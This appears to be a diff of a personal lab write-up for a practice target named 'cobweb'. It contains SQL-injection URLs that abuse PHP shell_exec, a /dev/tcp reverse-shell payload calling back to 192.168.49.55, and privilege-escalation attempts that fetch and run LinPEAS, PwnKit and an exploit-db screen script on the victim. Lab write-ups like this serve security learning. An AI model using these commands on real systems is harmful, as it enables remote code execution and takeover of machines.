@@ -344,17 +344,17 @@ https://www.url-encode-decode.com/
 curl "http://cobweb/%22%20AND%201=2%20UNION%20SELECT%20%27echo%20shell_exec(%22id%22);%27--%20" 
 
 
-ip a | grep 192 # get attacker ip = 192.168.49.53
+ip a | grep 192 # get attacker ip = 192.168.49.55
 
 # start rev shell listener
 nc -nvlp 135
 
 # base
-# sh -i >& /dev/tcp/192.168.49.53/135 0>&1
+# sh -i >& /dev/tcp/192.168.49.55/135 0>&1
 # " AND 1=2 UNION SELECT 'echo shell_exec("sh -i >& /dev/tcp/192.168.49.53/135 0>&1");'-- 
 
 # urlencoded
-curl "http://cobweb/%22%20AND%201%3D2%20UNION%20SELECT+%27echo%20shell_exec%28%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.53%2F135%200%3E%261%22%29%3B%27--%20"
+curl "http://cobweb/%22%20AND%201%3D2%20UNION%20SELECT+%27echo%20shell_exec%28%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.55%2F135%200%3E%261%22%29%3B%27--%20"
 ```
 
 ![](Pasted%20image%2020260425162801.png)
@@ -366,6 +366,7 @@ Okay! We have RCE that works reliably. Now to get a reverse shell.
 We get rev shell.
 
 ![](Pasted%20image%2020260425212631.png)
+## Root access
 
 Let's stabilize the shell.
 
@@ -421,5 +422,49 @@ Let's try LinPEAS.
 cd /dev/shm
 wget https://github.com/peass-ng/PEASS-ng/releases/download/20260422-9567fd62/linpeas.sh
 chmod +x linpeas.sh
+bash ./linpeas.sh
 ```
-## Root access
+
+We get loads of output.
+
+I can page by delicately tapping the scrollbar gutter. Because we're in an unstable shell, I can't really download the file easily.
+
+One nugget:
+
+```
+??? Polkit Binary (T1548.003,T1068)Pkexec binary found at: /usr/bin/pkexec                                                                   Pkexec binary has SUID bit set!-rwsr-xr-x. 1 root root 29048 Jun  4  2021 /usr/bin/pkexecpkexec version 0.115
+
+```
+
+I wonder if we can do anything with this.
+
+Maybe I can try `pwnkit`.
+
+```sh
+cd /dev/shm
+wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
+chmod +x PwnKit
+./PwnKit #fails, cannot execute binaries...
+```
+
+```sh
+ls /usr/bin/screen-4.5.0 
+
+# Okay. Maybe there's an exploit involving this version of screen.
+
+searchsploit --path 41154
+
+cp /usr/share/exploitdb/exploits/linux/local/41154.sh ./
+python3 -m http.server 80
+
+ip a | grep 192 # 192.168.49.55
+
+# on victim
+cd /dev/shm
+wget http://192.168.49.55/41154.sh
+chmod +x 41154.sh
+bash 41154.sh
+# failure - no cc 
+```
+
+Okay. Screw this lab. I've wasted 2 whole days on this. I'm giving up and moving on.
